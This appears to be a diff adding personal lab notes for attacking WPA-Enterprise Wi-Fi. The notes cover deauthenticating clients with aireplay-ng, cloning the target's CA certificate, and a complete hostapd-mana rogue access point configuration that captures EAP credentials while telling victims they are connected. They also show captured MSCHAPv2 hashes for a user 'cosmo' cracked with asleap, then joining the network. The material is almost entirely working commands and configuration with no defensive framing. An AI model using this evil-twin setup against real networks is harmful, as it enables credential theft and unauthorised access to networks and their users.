@@ -1,0 +1,126 @@
+564603
+292a00747d3ebe98a12c6edc1a0c6857
+## install win-kex
+    apt install kali-win-kex
+    kex --sl -s (seamless mode)
+
+    
+### Follow this
+airmon-ng start wlan0
+airodump-ng wlan0mon (find the wifi with "MGT" and find channel)
+#airodump-ng -c 3 -w wpa --essid wifu --bssid 34:08:04:09:3D:38 wlan0mon
+airodump-ng -c CHANEL -w enterprise --output-format pcap --ESSID NAMEOFAP --bssid MACOFMGT wlan0mon // this dumps info about wifi networks into pcap for wireshark
+aireplay-ng -0 1 -a BSSIDofAP -c CONNECTEDMAC wlan0mon
+airmon-ng stop wlan0
+wireshark enterprise.pcap
+    search tls.handshake.certificate OR tls.handshake.type == 11
+    open the TLSv1 Record Layer: Handshake Protocol: Certificate
+    expand Handshake Protocol: Certificate item, then Certificates
+    right click and select Export Packet Bytes to save the data into a file with a .der extension
+    display information about them using OpenSSL using openssl x509 -inform der -in CERTIFICATE_FILENAME -text
+apt install freeradius
+cd /etc/freeradius/3.0/certs 
+edit the [certificate_authority] fields to match our target CA certificate (output from openssl x509 -inform der -in CERTIFICATE_FILENAME -text)
+    nano ca.conf
+same in server.conf
+    nano /etc/freeradius/3.0/certs/server.conf
+rm dh // regen diffie-hellman parameters wth 2048 bit key
+make
+apt install hostapd-mana
+nano /etc/hostapd-mana/mana.conf
+                # SSID of the AP
+                ssid=Playtronics
+
+                # Network interface to use and driver type
+                # We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
+                interface=wlan0
+                driver=nl80211
+
+                # Channel and mode
+                # Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
+                channel=1
+                # Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
+                hw_mode=g
+
+                # Setting up hostapd as an EAP server
+                ieee8021x=1
+                eap_server=1
+
+                # Key workaround for Win XP
+                eapol_key_index_workaround=0
+
+                # EAP user file we created earlier
+                eap_user_file=/etc/hostapd-mana/mana.eap_user
+
+                # Certificate paths created earlier
+                ca_cert=/etc/freeradius/3.0/certs/ca.pem
+                server_cert=/etc/freeradius/3.0/certs/server.pem
+                private_key=/etc/freeradius/3.0/certs/server.key
+                # The password is actually 'whatever'
+                private_key_passwd=whatever
+                dh_file=/etc/freeradius/3.0/certs/dh
+
+                # Open authentication
+                auth_algs=1
+                # WPA/WPA2
+                wpa=3
+                # WPA Enterprise
+                wpa_key_mgmt=WPA-EAP
+                # Allow CCMP and TKIP
+                # Note: iOS warns when network has TKIP (or WEP)
+                wpa_pairwise=CCMP TKIP
+
+                # Enable Mana WPE
+                mana_wpe=1
+
+                # Store credentials in that file
+                mana_credout=/tmp/hostapd.credout
+
+                # Send EAP success, so the client thinks it's connected
+                mana_eapsuccess=1
+
+                # EAP TLS MitM
+                mana_eaptls=1
+
+nano /etc/hostapd-mana/mana-eap_user // create EAP user file referenced from config file just created
+                *     PEAP,TTLS,TLS,FAST
+                "t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
+
+## start the server with the created config file
+    hostapd-mana /etc/hostapd-mana/mana.conf
+
+## you will see when victim attempts to auth to our AP and login attempt being captured.
+cosmo
+MANA EAP EAP-MSCHAPV2 ASLEAP user=cosmo | asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4
+MANA EAP EAP-MSCHAPV2 JTR | cosmo:$NETNTLM$ceb69885c656590c$7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:::::::
+MANA EAP EAP-MSCHAPV2 HASHCAT | cosmo::::7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:ceb69885c656590c
+...
+These credentials are also in /tmp/hostapd.credout
+    When starting hostapd, we will append -B to run it in the background. The first few lines of hostapd will be displayed before it goes into the background, where it will continue to run until it successfully at creates the AP.
+
+    We will be using asleap to crack the password hash. We can copy/paste the output, starting with asleap, and append the wordlist /usr/share/john/password.lst to the -W parameter
+
+## once login captured, crack with asleep or hashcat
+    asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst
+
+
+## connect to network
+Create `wpa_supplicant.conf` file:
+    network={
+    ssid="NetworkName"
+    scan_ssid=1
+    key_mgmt=WPA-EAP
+    identity="Domain\username"
+    password="password"
+    eap=PEAP
+    phase1="peaplabel=0"
+    phase2="auth=MSCHAPV2"
+    }
+
+
+Connect to network:
+ip link show wlan0 // see if the device is down
+ip link set wlan0 up
+ip addr show wlan0  // if no ip    You may need to run 'ip addr flush dev wlan0' && `dhclient wlan0`
+wpa_supplicant -B -D wext -i wlan0 -c wpa_supplicant.conf
+
